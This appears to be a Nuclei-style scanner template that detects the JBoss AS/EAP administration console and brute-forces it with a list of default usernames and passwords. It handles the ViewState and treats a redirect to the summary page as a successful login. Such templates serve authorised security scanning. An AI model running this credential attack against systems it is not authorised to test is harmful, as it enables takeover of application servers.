id: jboss-admin-console-default-login

info:
  name: JBoss AS/EAP Admin Console - Default Login
  author: J2EEScan (ilmila), Tortuginator
  severity: high
  description: |
    The JBoss AS/EAP SEAM-based administration console (/admin-console/login.seam) was
    found accepting default or weak credentials, giving an attacker full remote
    administration of the application server. Ported from the J2EEScan "JBoss Admin
    Console" and "JBoss Admin Console Weak Password" checks.
  reference:
    - https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/JBossAdminConsole.java
    - http://docs.jboss.org/jbossas/6/Admin_Console_Guide/en-US/html/Administration_Console_User_Guide-Accessing_the_Console.html
    - https://www.exploit-db.com/exploits/36653/
    - https://bugzilla.redhat.com/show_bug.cgi?id=615956
  classification:
    cwe-id: CWE-798
  metadata:
    verified: true
    max-request: 181
    vendor: redhat
    product: jboss_application_server
    shodan-query: http.title:"JBoss AS Admin Console"
  tags: jboss,admin-console,default-login,seam,vuln

flow: http(1) && http(2)

http:
  # Request 1: detection gate - runs once; brute force (request 2) only
  # executes if this matches, so non-JBoss hosts are never brute forced.
  - raw:
      - |
        GET /admin-console/login.seam HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        internal: true
        dsl:
          - 'status_code == 200'
          - 'contains(body, "JBoss") && contains_any(body, "Admin Console", "Embedded Jopr")'
        condition: and

  # Request 2: GET (fresh ViewState) + POST, iterated by the clusterbomb.
  # The whole block repeats per credential pair, so a new ViewState/session
  # is obtained before each login attempt.
  - raw:
      - |
        GET /admin-console/login.seam HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /admin-console/login.seam HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        login_form=login_form&login_form:name={{user}}&login_form:password={{pass}}&login_form:submit=Login&javax.faces.ViewState={{viewstate}}

    attack: clusterbomb
    payloads:
      user:
        - admin
        - tomcat
        - manager
        - root
        - jboss
        - test
        - monitor
        - guest
        - system
      pass:
        - admin
        - jboss
        - password
        - ""
        - changethis
        - manager
        - root
        - "1234"
        - welcome1
        - test
    threads: 1
    stop-at-first-match: true

    extractors:
      - type: regex
        name: viewstate
        part: body
        internal: true
        group: 1
        regex:
          - 'id="javax.faces.ViewState" value="(.*?)"'

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 302'
          - 'contains(header_2, "secure/summary.seam")'
        condition: and